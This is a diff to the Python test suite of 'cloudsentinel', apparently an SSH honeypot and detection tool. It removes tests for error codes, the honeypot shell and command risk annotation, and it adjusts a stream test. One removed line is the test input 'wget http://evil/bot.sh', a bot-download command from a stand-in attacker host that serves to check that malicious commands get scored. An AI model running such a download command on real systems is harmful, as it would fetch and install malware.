@@ -8,7 +8,6 @@ from types import SimpleNamespace
 
 import pytest
 
-from cloudsentinel import exceptions
 from cloudsentinel.admin_api import (
     _latest_mttb_from_clickhouse,
     _load_attack_distribution_from_clickhouse,
@@ -25,7 +24,6 @@ from cloudsentinel.mitre import get_technique_info, score_auth_event, score_even
 from cloudsentinel.pipeline import EventEnvelope, EventPipeline
 from cloudsentinel.sandbox import DockerSandbox
 from cloudsentinel.server import CloudSentinelSSHServer, ConnectionLimiter
-from cloudsentinel.shell import HoneyPotInteractiveProtocol
 from cloudsentinel.stress_test import StressTest
 from cloudsentinel.stream import LiveStream
 from cloudsentinel.validate_phase1 import tcp_check, write_artifacts
@@ -33,19 +31,6 @@ from cloudsentinel.vfs import VirtualFileSystem
 from cloudsentinel.webhook import WebhookConfig, WebhookNotifier
 
 
-def test_exception_hierarchy() -> None:
-    error = exceptions.ConnectionRejectedError("1.2.3.4", "rate")
-    assert error.code == "CS401"
-    assert "1.2.3.4" in str(error)
-    assert exceptions.SessionLimitExceededError(3, 5).code == "CS402"
-    assert exceptions.FuzzDetectedError("1.2.3.4").code == "CS403"
-    assert exceptions.AuthLimitExceededError("1.2.3.4", 21).code == "CS404"
-    assert exceptions.SessionTimeoutError("abcdef123456", 30).code == "CS405"
-    assert exceptions.ProtocolViolationError("1.2.3.4").code == "CS406"
-    assert exceptions.BlockFailedError("1.2.3.4").code == "CS501"
-    assert exceptions.BlockTimeoutError("1.2.3.4").code == "CS502"
-    assert exceptions.RedisUnavailableError().code == "CS503"
-    assert exceptions.AllowlistBlockError("1.2.3.4").code == "CS504"
 
 
 def test_geoip_private_and_invalid() -> None:
@@ -116,7 +101,8 @@ async def test_stream_init_and_emit() -> None:
 
     stream._sio = FakeSio()
     stream._started = True
-    await stream.emit_coro({"eventid": "test", "system": "hidden"})
+    stream.emit({"eventid": "test", "system": "hidden"})
+    await asyncio.sleep(0)
     assert stream._sio.events[0][0] == "cloudsentinel:event"
     assert "system" not in stream._sio.events[0][1]
 
@@ -156,8 +142,6 @@ def test_mitre_auth_and_honeytoken() -> None:
 @pytest.mark.asyncio
 async def test_pipeline_annotate_and_optional_publish() -> None:
     pipeline = EventPipeline(RedisSettings())
-    annotation = pipeline._annotate_command("session-1", "wget http://evil/bot.sh")
-    assert annotation["risk_score"] > 0
     envelope = EventEnvelope(
         event_type="cloudsentinel.command.input",
         session_id="session-1",
@@ -258,15 +242,3 @@ def test_stress_test_init() -> None:
     assert test.MALICIOUS_CMDS
 
 
-def test_shell_init() -> None:
-    vfs = VirtualFileSystem.build_default()
-    protocol = HoneyPotInteractiveProtocol(
-        transport=SimpleNamespace(),
-        vfs=vfs,
-        username="root",
-        hostname="unit-host",
-        ip="8.8.8.8",
-    )
-    assert protocol.username == "root"
-    assert protocol.hostname == "unit-host"
-    assert protocol.clientIP == "8.8.8.8"
